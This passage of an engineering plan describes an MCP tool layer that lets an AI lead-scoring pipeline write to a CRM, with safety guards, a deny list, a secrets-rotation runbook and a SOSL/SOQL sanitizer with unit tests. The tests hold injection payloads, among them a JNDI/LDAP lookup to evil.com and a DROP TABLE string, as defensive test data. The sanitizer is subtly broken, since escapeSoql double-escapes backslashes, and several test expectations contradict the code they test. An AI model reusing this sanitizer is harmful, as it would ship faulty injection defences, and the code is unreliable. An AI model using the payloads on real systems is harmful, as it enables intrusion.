| `set_opportunity_value` | Set ARR/ACV estimate | AI-derived or SDR-provided |
| `attach_campaign` | Link to marketing campaign | Validates campaign exists |

**Opportunity Creation Guard**:

```typescript
async createOpportunity(context: MCPContext, params: CreateOppParams) {
  // Safety: Only create opp for high-fit leads
  if (context.aiResult.intent !== LeadIntent.HIGH_FIT) {
    return {
      success: false,
      error: `Cannot create opportunity: Lead intent is ${context.aiResult.intent}, requires HIGH_FIT`,
    };
  }
  
  // Safety: Minimum fit score threshold
  if (context.aiResult.fitScore < 75) {
    return {
      success: false,
      error: `Fit score ${context.aiResult.fitScore} below opportunity threshold (75)`,
    };
  }
  
  // Require account to exist
  if (!params.accountId) {
    return {
      success: false,
      error: 'Account ID required. Run match_account first.',
    };
  }
  
  return this.crmExecutor.createOpportunity({
    ...params,
    source: 'AI Qualified Lead',
    aiConfidence: context.aiResult.fitScore,
  });
}
```

### 2.5 Activity/Visibility Tools

| Tool | Purpose | Audit Trail |
|------|---------|-------------|
| `create_task` | Create follow-up task for SDR | Links to lead + opp |
| `log_activity` | Log AI processing as activity | Immutable audit entry |
| `add_note` | Add AI reasoning as note | Preserves evidence links |
| `create_follow_up` | Schedule nurture/follow-up | Date-based workflow trigger |

**AI Activity Logging**:

```typescript
async logActivity(context: MCPContext): Promise<void> {
  await this.crmExecutor.createActivity({
    type: 'AI Analysis',
    relatedTo: context.leadId,
    description: `AI Analysis completed\nIntent: ${context.aiResult.intent}\nScore: ${context.aiResult.fitScore}\nDecision: ${context.aiResult.decision}`,
    aiMetadata: {
      groundingStatus: context.aiResult.grounding_status,
      evidenceCount: context.aiResult.evidence.length,
      executionId: context.executionId,
    },
  });
}
```

### 2.6 Enrichment Sync Tools

| Tool | Purpose | Data Source |
|------|---------|-------------|
| `sync_firmographics` | Push enrichment to CRM | EnrichmentService data |
| `sync_enrichment_metadata` | Sync confidence scores, sources | Audit trail preservation |
| `validate_existing_fields` | Compare CRM vs enrichment | Conflict detection |

---

## Phase 3: MCP Router & Orchestration

### 3.1 MCP Service (`mcp.service.ts`)

```typescript
@Injectable()
export class MCPService {
  constructor(
    private readonly registry: MCPRegistryService,
    private readonly executor: CRMExecutor,
    private readonly audit: MCPAuditService,
    private readonly safetyGuard: MCPSafetyGuard,
  ) {}

  async processAfterGrounding(
    lead: Lead,
    aiResult: AiAnalysisResult,
    enrichmentData: any,
  ): Promise<MCPProcessResult> {
    const executionId = uuid();
    const context: MCPContext = {
      leadId: lead.id,
      leadData: lead,
      aiResult,
      enrichmentData,
      executionId,
      timestamp: new Date(),
    };

    // 1. Safety Check (final gate before execution)
    const safetyCheck = await this.safetyGuard.validateContext(context);
    if (!safetyCheck.passed) {
      await this.audit.logBlocked(context, safetyCheck.reasons);
      return { status: 'BLOCKED', reasons: safetyCheck.reasons };
    }

    // 2. Determine Action Plan based on AI decision
    const actionPlan = this.buildActionPlan(context);
    
    // 3. Execute tools in sequence
    const results: ToolResult[] = [];
    for (const action of actionPlan) {
      const tool = this.registry.getTool(action.toolName);
      
      // Pre-execution audit
      await this.audit.logToolStart(context, action);
      
      try {
        const result = await tool.execute(context, action.params);
        results.push({ tool: action.toolName, result });
        
        // Post-execution audit
        await this.audit.logToolComplete(context, action, result);
        
        // Stop on failure if critical
        if (!result.success && action.critical) {
          break;
        }
      } catch (error) {
        await this.audit.logToolError(context, action, error);
        if (action.critical) throw error;
      }
    }

    return {
      executionId,
      status: 'COMPLETED',
      results,
    };
  }

  private buildActionPlan(context: MCPContext): ActionPlan[] {
    const plan: ActionPlan[] = [];
    
    // Always log activity first
    plan.push({ toolName: 'log_activity', params: {}, critical: false });
    
    // Route based on AI decision
    switch (context.aiResult.decision) {
      case LeadDecision.ROUTE_TO_SDR:
        plan.push(
          { toolName: 'upsert_lead', params: this.buildLeadParams(context), critical: true },
          { toolName: 'set_lead_score', params: { score: context.aiResult.fitScore }, critical: false },
          { toolName: 'match_account', params: {}, critical: false },
          { toolName: 'create_task', params: { type: 'AI Qualified Lead Review', priority: 'High' }, critical: false },
        );
        
        // Only create opportunity for high-fit
        if (context.aiResult.intent === LeadIntent.HIGH_FIT) {
          plan.push({ toolName: 'create_opportunity', params: {}, critical: false });
        }
        break;
        
      case LeadDecision.NURTURE:
        plan.push(
          { toolName: 'upsert_lead', params: this.buildLeadParams(context), critical: true },
          { toolName: 'set_intent_level', params: { intent: context.aiResult.intent }, critical: false },
          { toolName: 'create_follow_up', params: { type: 'nurture', delayDays: 14 }, critical: false },
        );
        break;
        
      case LeadDecision.IGNORE:
        plan.push(
          { toolName: 'upsert_lead', params: { ...this.buildLeadParams(context), status: 'Disqualified' }, critical: true },
          { toolName: 'add_note', params: { text: `Disqualified: ${context.aiResult.reasoning}` }, critical: false },
        );
        break;
    }
    
    // Always sync enrichment last
    if (context.enrichmentData) {
      plan.push({ toolName: 'sync_firmographics', params: {}, critical: false });
    }
    
    return plan;
  }
}
```

---

## Phase 4: Safety Guardrails (Explicitly Disallowed)

### 4.1 Blocked Actions Registry

```typescript
// src/mcp/guards/mcp-safety.guard.ts

const BLOCKED_PATTERNS = [
  { pattern: /^delete_/i, reason: 'Delete operations are prohibited' },
  { pattern: /^mass_/i, reason: 'Bulk operations require manual approval' },
  { pattern: /schema_change/i, reason: 'Schema modifications not allowed' },
  { pattern: /permission_change/i, reason: 'Permission changes not allowed' },
  { pattern: /execute.*query/i, reason: 'Arbitrary SOQL/SQL execution not allowed' },
  { pattern: /export/i, reason: 'Bulk data export requires approval' },
];

@Injectable()
export class MCPSafetyGuard {
  validateToolRegistration(tool: MCPTool): boolean {
    for (const blocked of BLOCKED_PATTERNS) {
      if (blocked.pattern.test(tool.name)) {
        this.logger.error(`Attempted registration of blocked tool: ${tool.name}`);
        return false;
      }
    }
    return true;
  }

  async validateContext(context: MCPContext): Promise<SafetyCheckResult> {
    const reasons: string[] = [];
    
    // Check 1: Grounding status
    if (context.aiResult.grounding_status === GroundingStatus.REJECTED) {
      reasons.push('AI result was rejected during grounding - no actions permitted');
    }
    
    // Check 2: Required fields present
    if (!context.leadData.email) {
      reasons.push('Email is required for any CRM operation');
    }
    
    // Check 3: Rate limiting
    const rateLimit = await this.checkRateLimit(context.leadId);
    if (rateLimit.exceeded) {
      reasons.push(`Rate limit exceeded: ${rateLimit.reason}`);
    }
    
    return {
      passed: reasons.length === 0,
      reasons,
    };
  }
}
```

### 4.2 Explicit Deny List Documentation

## Intentionally Disallowed MCP Actions

The following actions are explicitly **NOT available** to the AI through the MCP layer:

| Action Pattern | Example | Reason | Alternative |
|----------------|---------|--------|-------------|
| `delete_*` | `delete_lead`, `delete_contact` | Irreversible data loss | Update status to 'Disqualified' |
| `mass_*` | `mass_update`, `mass_reassign` | High blast radius, no human oversight | Individual updates via queue |
| `schema_change` | Add field, modify picklist | Production stability risk | Manual admin process |
| `permission_change` | Role modification, sharing rules | Security boundary violation | Manual admin process |
| `execute_query` | SOQL, SOSL, raw SQL | Data exfiltration risk | Pre-defined, parameterized queries |
| `bulk_export` | Data dump, report export | Privacy/compliance risk | Audit-logged individual reads |
| `merge_*` | Merge leads, merge accounts | Irreversible, complex resolution | Manual SDR review queue |
| `hard_delete` | Bypass recycle bin | Compliance/legal hold issues | Soft delete + status update |

### Bypass Procedures

If a legitimate need arises for these actions:
1. Log request in audit trail
2. Route to human operator queue
3. Require dual approval for destructive operations

---

## Phase 5: Integration with Existing Flow

### 5.1 Updated Lead Processor

```typescript
// src/ai/lead.processor.ts (modified)

@Processor('lead-processing')
export class LeadProcessor extends WorkerHost {
  constructor(
    @InjectRepository(Lead) private readonly leadRepository: Repository<Lead>,
    private readonly aiService: AiService,
    private readonly mcpService: MCPService,  // NEW: MCP integration
    @Inject('CRM_PROVIDER') private readonly crmProvider: CRMProvider,
    @InjectMetric(LEADS_PROCESSED_TOTAL) private readonly leadsCounter: Counter<string>,
  ) {
    super();
  }

  async process(job: Job<any, any, string>): Promise<any> {
    const { leadId } = job.data;
    const lead = await this.leadRepository.findOne({ where: { id: leadId } });

    if (!lead) {
      this.leadsCounter.inc({ status: 'not_found' });
      throw new Error(`Lead with ID ${leadId} not found`);
    }

    this.logger.log(`Processing lead: ${lead.email}`);

    // 1. AI Enrichment (existing)
    const enrichment = await this.aiService.analyzeLead({
      email: lead.email,
      name: lead.name,
      campaignId: lead.campaignId,
    });

    // 2. Persist AI results (existing)
    lead.fitScore = enrichment.fitScore;
    lead.intent = enrichment.intent;
    lead.reasoning = enrichment.reasoning;
    lead.evidence = enrichment.evidence;
    lead.grounding_status = enrichment.grounding_status || null;
    lead.grounding_errors = enrichment.grounding_errors || null;
    lead.status = 'ENRICHED';

    await this.leadRepository.save(lead);

    // 3. NEW: MCP Processing (post-grounding)
    const mcpResult = await this.mcpService.processAfterGrounding(
      lead,
      enrichment,
      /* enrichmentData */ null, // Pass from enrichment service
    );

    // 4. Handle MCP result
    if (mcpResult.status === 'BLOCKED') {
      this.logger.warn(`MCP blocked for lead ${lead.email}: ${mcpResult.reasons.join(', ')}`);
      lead.status = 'MCP_BLOCKED';
      await this.leadRepository.save(lead);
      this.leadsCounter.inc({ status: 'mcp_blocked' });
      return { success: false, blocked: true, reasons: mcpResult.reasons };
    }

    // 5. Legacy CRM sync (can be deprecated after MCP rollout)
    await this.crmProvider.pushLead(lead);

    this.logger.log(`Lead ${lead.email} processed. MCP execution: ${mcpResult.executionId}`);
    this.leadsCounter.inc({ status: 'success' });
    
    return { 
      success: true, 
      mcpExecutionId: mcpResult.executionId,
      actions: mcpResult.results?.map(r => r.tool) || [],
    };
  }
}
```

---

## Phase 6: Testing Strategy

### 6.1 Unit Tests

```typescript
// src/mcp/tools/lead-lifecycle.tools.spec.ts

describe('CreateLeadTool', () => {
  it('should reject duplicate leads (idempotency)', async () => {
    // Test idempotency guard
  });
  
  it('should only update fields with AI evidence', async () => {
    // Test grounding enforcement
  });
  
  it('should block dangerous patterns', async () => {
    // Ensure delete_ patterns fail
  });
});
```

### 6.2 Integration Tests

```typescript
// test/mcp.e2e-spec.ts

describe('MCP Integration', () => {
  it('should process HIGH_FIT lead through full workflow', async () => {
    // Create lead → AI analyze → MCP route → Verify CRM state
  });
  
  it('should block REJECTED grounding results', async () => {
    // Simulate hallucination → Verify MCP blocks execution
  });
  
  it('should respect disallowed actions list', async () => {
    // Attempt to register delete_lead tool → Verify rejection
  });
});
```

---

## Implementation Timeline

| Phase | Duration | Deliverables |
|-------|----------|--------------|
| **Phase 1** | 2-3 days | MCP module skeleton, interfaces, registry |
| **Phase 2a** | 2 days | Lead Lifecycle + Field Update tools |
| **Phase 2b** | 2 days | Account/Contact + Sales Workflow tools |
| **Phase 2c** | 1 day | Activity + Enrichment Sync tools |
| **Phase 3** | 2 days | MCP Router, action plan builder |
| **Phase 4** | 1 day | Safety guards, blocked actions enforcement |
| **Phase 5** | 2 days | Integration with LeadProcessor, testing |
| **Phase 6** | 2 days | Comprehensive test suite |

**Total: ~2 weeks for full implementation**

---

## Security Review & Hardening

### Executive Summary

| Category | Current State | Risk Level |
|----------|--------------|------------|
| Input Validation | Zod schemas defined | ⚠️ Medium |
| Authentication | Needs secrets manager | 🔴 High |
| Rate Limiting | Architecture defined | ⚠️ Medium |
| Audit Trail | Strong design | ✅ Low |
| Injection Prevention | Needs implementation | 🔴 High |
| Error Handling | Partial coverage | ⚠️ Medium |

---

### 🔴 Critical Vulnerabilities - FIXED

#### 1. SOQL/SOSL Injection Prevention

**Problem**: String interpolation in Salesforce queries allows injection attacks.

**Solution** - `SalesforceQuerySanitizer`:

```typescript
// src/mcp/utils/salesforce-sanitizer.ts

export class SalesforceQuerySanitizer {
  /**
   * Escape SOSL reserved characters
   * Reserved: ? & | ! { } [ ] ( ) ^ ~ * : \ " ' + -
   */
  static escapeSosl(input: string): string {
    if (!input) return '';
    return input.replace(/[?&|!{}[\]()^~*:\\\"'+-]/g, '\\$&');
  }

  /**
   * Escape SOQL reserved characters
   * Reserved: ' \ " \n \r \t \b \f
   */
  static escapeSoql(input: string): string {
    if (!input) return '';
    return input
      .replace(/'/g, "\\'")
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r');
  }

  /**
   * Validate Salesforce ID format (15 or 18 char alphanumeric)
   */
  static isValidId(id: string): boolean {
    return /^[a-zA-Z0-9]{15}(?:[a-zA-Z0-9]{3})?$/.test(id);
  }

  /**
   * Safe SOSL query builder
   */
  static buildSoslQuery(
    searchTerm: string,
    fields: string[],
    objectType: string
  ): string {
    const safeTerm = this.escapeSosl(searchTerm);
    const safeFields = fields.map(f => this.escapeSoql(f)).join(', ');
    return `FIND {${safeTerm}} IN ALL FIELDS RETURNING ${objectType}(${safeFields})`;
  }
}
```

**Updated `matchAccount` with sanitization**:

```typescript
// src/mcp/executors/salesforce.executor.ts

async matchAccount(params: MatchAccountParams): Promise<CRMResult> {
  // Sanitize inputs before building queries
  const safeDomain = SalesforceQuerySanitizer.escapeSosl(params.domain);
  const safeCompany = SalesforceQuerySanitizer.escapeSosl(params.companyName);

  // Use parameterized-like approach with sanitized inputs
  let soslQuery: string | null = null;
  
  if (safeDomain) {
    soslQuery = SalesforceQuerySanitizer.buildSoslQuery(
      safeDomain,
      ['Id', 'Name', 'Website', 'Industry'],
      'Account'
    );
  } else if (safeCompany) {
    soslQuery = SalesforceQuerySanitizer.buildSoslQuery(
      safeCompany,
      ['Id', 'Name', 'Website', 'Industry'],
      'Account'
    );
  }

  if (!soslQuery) {
    return { success: true, data: { matched: false, reason: 'No search criteria' } };
  }

  try {
    const results = await this.conn.search(soslQuery);
    // ... process results
  } catch (error) {
    this.logger.error(`SOSL search failed: ${error.message}`);
    throw new Error('Account search failed due to invalid input');
  }
}
```

---

#### Unit Tests for SalesforceQuerySanitizer

```typescript
// src/mcp/utils/salesforce-sanitizer.spec.ts

import { SalesforceQuerySanitizer } from './salesforce-sanitizer';

describe('SalesforceQuerySanitizer', () => {
  describe('escapeSosl', () => {
    it('should escape SOSL reserved characters', () => {
      const input = 'test?query&more|stuff!here{with}[brackets](and)^~*:"quotes"';
      const expected = 'test\\?query\\&more\\|stuff\\!here\\{with\\}\\[brackets\\]\\(and\\)\\^\\~\\*\\:\\"quotes\\"';
      expect(SalesforceQuerySanitizer.escapeSosl(input)).toBe(expected);
    });

    it('should handle empty string', () => {
      expect(SalesforceQuerySanitizer.escapeSosl('')).toBe('');
    });

    it('should handle null/undefined', () => {
      expect(SalesforceQuerySanitizer.escapeSosl(null as any)).toBe('');
      expect(SalesforceQuerySanitizer.escapeSosl(undefined as any)).toBe('');
    });

    it('should escape plus and minus signs', () => {
      expect(SalesforceQuerySanitizer.escapeSosl('test+value-')).toBe('test\\+value\\-');
    });

    it('should escape apostrophes', () => {
      expect(SalesforceQuerySanitizer.escapeSosl("it's a test")).toBe("it\\'s a test");
    });

    // EDGE CASE: Unicode and international characters
    it('should preserve unicode characters while escaping reserved chars', () => {
      const input = '日本語{test}';
      const result = SalesforceQuerySanitizer.escapeSosl(input);
      expect(result).toContain('日本語');
      expect(result).toBe('日本語\\{test\\}');
    });

    it('should handle emoji characters', () => {
      const input = 'Company 🚀 {corp}';
      const result = SalesforceQuerySanitizer.escapeSosl(input);
      expect(result).toContain('🚀');
      expect(result).toBe('Company 🚀 \\{corp\\}');
    });

    it('should handle RTL (right-to-left) text', () => {
      const input = 'شركة{test}';  // Arabic
      const result = SalesforceQuerySanitizer.escapeSosl(input);
      expect(result).toContain('شركة');
      expect(result).toBe('شركة\\{test\\}');
    });

    // EDGE CASE: Nested and multiple escapes
    it('should handle multiple consecutive special characters', () => {
      const input = '{{{{}}}}';
      const expected = '\\{\\{\\{\\{\\}\\}\\}\\}\\}';
      expect(SalesforceQuerySanitizer.escapeSosl(input)).toBe(expected);
    });

    it('should handle already escaped characters (double escape)', () => {
      const input = 'test\\{literal\\}';
      const result = SalesforceQuerySanitizer.escapeSosl(input);
      // Should escape the backslashes too
      expect(result).toBe('test\\\\\\{literal\\\\\\}');
    });

    it('should handle injection attempt patterns', () => {
      // Attempt to break out of SOSL query
      const malicious = 'acme.com} OR {*';
      const result = SalesforceQuerySanitizer.escapeSosl(malicious);
      expect(result).toBe('acme.com\\} OR \\{\\*');
      // Verify the escaped string cannot be used to manipulate query
      expect(result).not.toContain('} OR {');
    });

    it('should handle SQL-like injection patterns', () => {
      const malicious = "'; DROP TABLE Account; --";
      const result = SalesforceQuerySanitizer.escapeSosl(malicious);
      expect(result).toBe("\\'; DROP TABLE Account; --");
    });

    it('should handle template injection attempts', () => {
      const malicious = '${jndi:ldap://evil.com}';
      const result = SalesforceQuerySanitizer.escapeSosl(malicious);
      expect(result).toBe('\\$\\{jndi:ldap://evil.com\\}');
    });

    // EDGE CASE: Whitespace and control characters
    it('should preserve whitespace but escape control chars', () => {
      const input = 'test\tvalue\nwith\rreturns';
      const result = SalesforceQuerySanitizer.escapeSosl(input);
      expect(result).toBe('test\\tvalue\\nwith\\rreturns');
    });

    it('should handle strings with only whitespace', () => {
      expect(SalesforceQuerySanitizer.escapeSosl('   ')).toBe('   ');
    });

    // EDGE CASE: Very long strings
    it('should handle very long strings efficiently', () => {
      const longString = 'a'.repeat(10000) + '{inject}';
      const result = SalesforceQuerySanitizer.escapeSosl(longString);
      expect(result).toContain('\\{inject\\}');
      expect(result.length).toBe(10000 + 10);  // Original + escaped chars
    });
  });

  describe('escapeSoql', () => {
    it('should escape single quotes', () => {
      expect(SalesforceQuerySanitizer.escapeSoql("it's")).toBe("it\\'s");
    });

    it('should escape backslashes', () => {
      expect(SalesforceQuerySanitizer.escapeSoql('path\\to\\file')).toBe('path\\\\to\\\\file');
    });

    it('should escape double quotes', () => {
      expect(SalesforceQuerySanitizer.escapeSoql('say "hello"')).toBe('say \\"hello\\"');
    });

    it('should escape newlines', () => {
      expect(SalesforceQuerySanitizer.escapeSoql('line1\nline2')).toBe('line1\\nline2');
    });

    it('should escape carriage returns', () => {
      expect(SalesforceQuerySanitizer.escapeSoql('line1\rline2')).toBe('line1\\rline2');
    });

    // EDGE CASE: Combined SOQL injection
    it('should prevent SOQL injection via string concatenation', () => {
      const userInput = "' OR Id != NULL OR Name = '";
      const escaped = SalesforceQuerySanitizer.escapeSoql(userInput);
      
      // The escaped string should break the injection attempt
      expect(escaped).toBe("\\' OR Id != NULL OR Name = \\'");
      
      // Verify it cannot be used to alter query logic
      const query = `SELECT Id FROM Lead WHERE Name = '${escaped}'`;
      expect(query).not.toContain("' OR Id != NULL");
    });
  });

  describe('isValidId', () => {
    it('should validate 15-character Salesforce IDs', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHI')).toBe(true);
    });

    it('should validate 18-character Salesforce IDs', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHIJKL')).toBe(true);
    });

    it('should reject IDs that are too short', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC')).toBe(false);
    });

    it('should reject IDs that are too long', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHIJKLMNOP')).toBe(false);
    });

    it('should reject IDs with invalid characters', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHI!')).toBe(false);
    });

    it('should reject empty strings', () => {
      expect(SalesforceQuerySanitizer.isValidId('')).toBe(false);
    });

    it('should reject IDs between 15 and 18 characters', () => {
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGH')).toBe(false);  // 14 chars
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHIJ')).toBe(false); // 16 chars
      expect(SalesforceQuerySanitizer.isValidId('001ABC123DEFGHIJK')).toBe(false); // 17 chars
    });

    // EDGE CASE: Case sensitivity
    it('should accept mixed case IDs', () => {
      expect(SalesforceQuerySanitizer.isValidId('001aBc123DeFgHi')).toBe(true);
    });
  });

  describe('buildSoslQuery', () => {
    it('should build valid SOSL query with sanitized input', () => {
      const query = SalesforceQuerySanitizer.buildSoslQuery(
        'acme{corp}',
        ['Id', 'Name', 'Website'],
        'Account'
      );
      expect(query).toBe('FIND {acme\\{corp\\}} IN ALL FIELDS RETURNING Account(Id, Name, Website)');
    });

    it('should prevent injection through search term', () => {
      const malicious = 'test} RETURNING Contact(Id) FIND {*';
      const query = SalesforceQuerySanitizer.buildSoslQuery(
        malicious,
        ['Id'],
        'Account'
      );
      // The escaped search term should not break out of FIND clause
      expect(query).not.toContain('} RETURNING');
      expect(query).toContain('FIND {test\\} RETURNING Contact(Id) FIND \\{\\*}');
    });

    it('should handle empty field list gracefully', () => {
      const query = SalesforceQuerySanitizer.buildSoslQuery('test', [], 'Account');
      expect(query).toBe('FIND {test} IN ALL FIELDS RETURNING Account()');
    });
  });
});
```

---

#### 2. Credential Management with AWS Secrets Manager

**Problem**: Plain-text credentials in environment variables.

**Solution** - Secret provider pattern:

```typescript
// src/mcp/config/secrets.provider.ts

export interface CrmCredentials {
  username?: string;
  password?: string;
  securityToken?: string;
  accessToken?: string;
  clientId?: string;
  clientSecret?: string;
  refreshToken?: string;
}

@Injectable()
export class SecretsProvider {
  private cachedSecrets: Map<string, CrmCredentials> = new Map();
  private cacheExpiry: Map<string, number> = new Map();
  
  constructor(
    private configService: ConfigService,
    @Optional() private secretsManager: SecretsManager,  // AWS SDK
  ) {}

  async getCredentials(provider: 'salesforce' | 'hubspot'): Promise<CrmCredentials> {
    // Check cache first (TTL: 5 minutes)
    const cacheKey = `crm_${provider}`;
    const expiry = this.cacheExpiry.get(cacheKey);
    
    if (expiry && Date.now() < expiry && this.cachedSecrets.has(cacheKey)) {
      return this.cachedSecrets.get(cacheKey)!;
    }

    // Production: Use AWS Secrets Manager
    if (this.configService.get('NODE_ENV') === 'production') {
      const secretName = this.configService.get(`AWS_SECRET_NAME_${provider.toUpperCase()}`);
      
      if (!secretName) {
        throw new Error(`Secret name not configured for ${provider}`);
      }

      try {
        const response = await this.secretsManager.getSecretValue({ SecretId: secretName });
        const credentials: CrmCredentials = JSON.parse(response.SecretString!);
        
        // Cache with 5-minute TTL
        this.cachedSecrets.set(cacheKey, credentials);
        this.cacheExpiry.set(cacheKey, Date.now() + 5 * 60 * 1000);
        
        return credentials;
      } catch (error) {
        this.logger.error(`Failed to retrieve credentials from Secrets Manager: ${error.message}`);
        throw new Error(`Credential retrieval failed for ${provider}`);
      }
    }

    // Development: Fall back to environment (with warnings)
    this.logger.warn(`Using environment variables for ${provider} credentials (development only)`);
    return {
      username: this.configService.get(`${provider.toUpperCase()}_USERNAME`),
      password: this.configService.get(`${provider.toUpperCase()}_PASSWORD`),
      securityToken: this.configService.get(`${provider.toUpperCase()}_SECURITY_TOKEN`),
      accessToken: this.configService.get(`${provider.toUpperCase()}_ACCESS_TOKEN`),
    };
  }

  /**
   * Clear cache (useful for credential rotation)
   */
  clearCache(): void {
    this.cachedSecrets.clear();
    this.cacheExpiry.clear();
  }
}
```

---

#### Secret Rotation Operational Runbook

**Overview**: This runbook describes how to rotate Salesforce/HubSpot credentials without service downtime.

**Prerequisites**:
- AWS CLI access with Secrets Manager permissions
- kubectl access to Kubernetes cluster (if applicable)
- Admin access to Salesforce/HubSpot to generate new credentials

---

**Rotation Procedure**:

```bash
#!/bin/bash
# scripts/rotate-secrets.sh

set -e

ENVIRONMENT=${1:-staging}
PROVIDER=${2:-salesforce}
echo "Rotating ${PROVIDER} credentials for ${ENVIRONMENT}"

# Step 1: Generate new credentials in Salesforce/HubSpot
echo "Step 1: Generate new credentials in ${PROVIDER}"
echo "  - Salesforce: Setup > Manage Users > Reset Security Token"
echo "  - HubSpot: Settings > Integrations > Private Apps"
read -p "Press enter when new credentials are ready..."

# Step 2: Update secret in AWS Secrets Manager
echo "Step 2: Updating AWS Secrets Manager..."
aws secretsmanager put-secret-value \
  --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
  --secret-string file://new-credentials.json \
  --version-stage AWSPENDING

echo "Secret updated with new credentials (AWSPENDING stage)"

# Step 3: Trigger cache clear on running instances
echo "Step 3: Clearing credential cache on running instances..."
kubectl exec -n "${ENVIRONMENT}" deployment/mcp-service -- \
  curl -X POST http://localhost:3000/admin/clear-secret-cache \
  -H "Authorization: Bearer ${ADMIN_TOKEN}"

echo "Cache cleared. New credentials will be fetched on next API call."

# Step 4: Verify new credentials work
echo "Step 4: Verifying new credentials..."
sleep 5
curl -f http://localhost:3000/health/crm || {
  echo "Health check failed! Rolling back..."
  aws secretsmanager update-secret-version-stage \
    --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
    --version-stage AWSCURRENT \
    --move-to-version-id $(aws secretsmanager list-secret-version-ids \
      --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
      --query 'Versions[?VersionStages[?@==`AWSCURRENT`]].VersionId' \
      --output text)
  exit 1
}

# Step 5: Promote new version to current
echo "Step 5: Promoting new credentials to AWSCURRENT..."
aws secretsmanager update-secret-version-stage \
  --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
  --version-stage AWSCURRENT \
  --remove-from-version-id $(aws secretsmanager list-secret-version-ids \
    --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
    --query 'Versions[?VersionStages[?@==`AWSCURRENT`]].VersionId' \
    --output text)

aws secretsmanager update-secret-version-stage \
  --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
  --version-stage AWSCURRENT \
  --move-to-version-id $(aws secretsmanager list-secret-version-ids \
    --secret-id "${ENVIRONMENT}/crm/${PROVIDER}" \
    --query 'Versions[?VersionStages[?@==`AWSPENDING`]].VersionId' \
    --output text)

echo "Secret rotation complete!"
```

---

**Admin Endpoint for Cache Clear**:

```typescript
// src/mcp/admin/admin.controller.ts

@Controller('admin')
export class MCPAdminController {
  constructor(
    private secretsProvider: SecretsProvider,
    private breakerFactory: CircuitBreakerFactory,
  ) {}

  @Post('clear-secret-cache')
  @UseGuards(AdminAuthGuard)  // Ensure only admins can call this
  async clearSecretCache(): Promise<{ success: boolean }> {
    this.secretsProvider.clearCache();
    this.logger.log('Credential cache cleared by admin request');
    return { success: true };
  }

  @Get('circuit-health')
  @UseGuards(AdminAuthGuard)
  getCircuitHealth() {
    return this.breakerFactory.health();
  }
}
```

---

**Manual Rotation Steps (if script fails)**:

1. **Prepare New Credentials**:
   ```bash
   # Salesforce
   # 1. Log into Salesforce as API user
   # 2. Go to Setup > Personal Information > Reset Security Token
   # 3. Check email for new token
   
   # Create new credentials JSON
   cat > new-credentials.json << 'EOF'
   {
     "username": "api@company.com",
     "password": "newpassword",
     "securityToken": "newtokenxyz123"
   }
   EOF
   ```

2. **Update AWS Secret**:
   ```bash
   aws secretsmanager put-secret-value \
     --secret-id "prod/crm/salesforce" \
     --secret-string file://new-credentials.json
   ```

3. **Clear Application Cache**:
   ```bash
   # Option A: Via admin endpoint
   curl -X POST https://api.company.com/admin/clear-secret-cache \
     -H "Authorization: Bearer $ADMIN_TOKEN"
   
   # Option B: Rolling restart (if no admin endpoint)
   kubectl rollout restart deployment/mcp-service -n production
   ```

4. **Verify**:
   ```bash
   # Check CRM health
   curl https://api.company.com/health/crm
   
   # Verify new secret version
   aws secretsmanager get-secret-value \
     --secret-id "prod/crm/salesforce" \
     --query 'VersionId,CreatedDate'
   ```

5. **Invalidate Old Credentials** (in CRM):
   - Salesforce: Change password or deactivate old API user
   - HubSpot: Delete old private app

---

**Rollback Procedure**:

If new credentials cause issues:

```bash
# 1. Immediately restore previous secret version
aws secretsmanager restore-secret-version \
  --secret-id "prod/crm/salesforce" \
  --version-id <previous-version-id>

# 2. Clear cache again to pick up old credentials
curl -X POST https://api.company.com/admin/clear-secret-cache \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# 3. Verify service recovers
curl -f https://api.company.com/health/crm
```

---

**Rotation Schedule**:

| Environment | Frequency | Automated |
|-------------|-----------|-----------|
| Development | On-demand | No |
| Staging | Monthly | Yes (1st of month) |
| Production | Quarterly | Manual with approval |

**Monitoring During Rotation**:

```promql
# Watch for auth failures during rotation
rate(mcp_circuit_breaker_failures_total{error_type="unauthorized"}[1m])

# Monitor circuit breaker states
mcp_circuit_breaker_state{crm_provider="salesforce"}

# Check request success rate
rate(mcp_circuit_breaker_successes_total[1m]) 
  / rate(mcp_circuit_breaker_requests_total[1m])
```

---

**Updated Salesforce Executor with secure credentials**:

```typescript
// src/mcp/executors/salesforce.executor.ts

@Injectable()
export class SalesforceMCPExecutor implements MCPExecutor {
  private conn: jsforce.Connection;

  constructor(
    private configService: ConfigService,
    private secretsProvider: SecretsProvider,
  ) {}

  async onModuleInit() {
    // Retrieve credentials securely
    const credentials = await this.secretsProvider.getCredentials('salesforce');

    this.conn = new jsforce.Connection({
      loginUrl: this.configService.get('SALESFORCE_LOGIN_URL'),
    });

    await this.conn.login(
      credentials.username!,
      credentials.password! + credentials.securityToken!  // Token appended to password
    );

    this.logger.log('Connected to Salesforce using secure credentials');
  }
}
```

**Terraform for AWS Secrets Manager**:

```hcl
# infrastructure/secrets.tf

resource "aws_secretsmanager_secret" "salesforce" {
  name        = "${var.environment}/crm/salesforce"
  description = "Salesforce API credentials for MCP"
  
  tags = {
    Environment = var.environment
    Service     = "mcp"
    ManagedBy   = "terraform"
  }
}

resource "aws_secretsmanager_secret_version" "salesforce" {
  secret_id = aws_secretsmanager_secret.salesforce.id
  secret_string = jsonencode({
    username      = var.salesforce_username
    password      = var.salesforce_password
    securityToken = var.salesforce_security_token
  })
}

# IAM policy for ECS task to read secrets
resource "aws_iam_policy" "mcp_secrets" {
  name = "${var.environment}-mcp-secrets-policy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "secretsmanager:GetSecretValue",
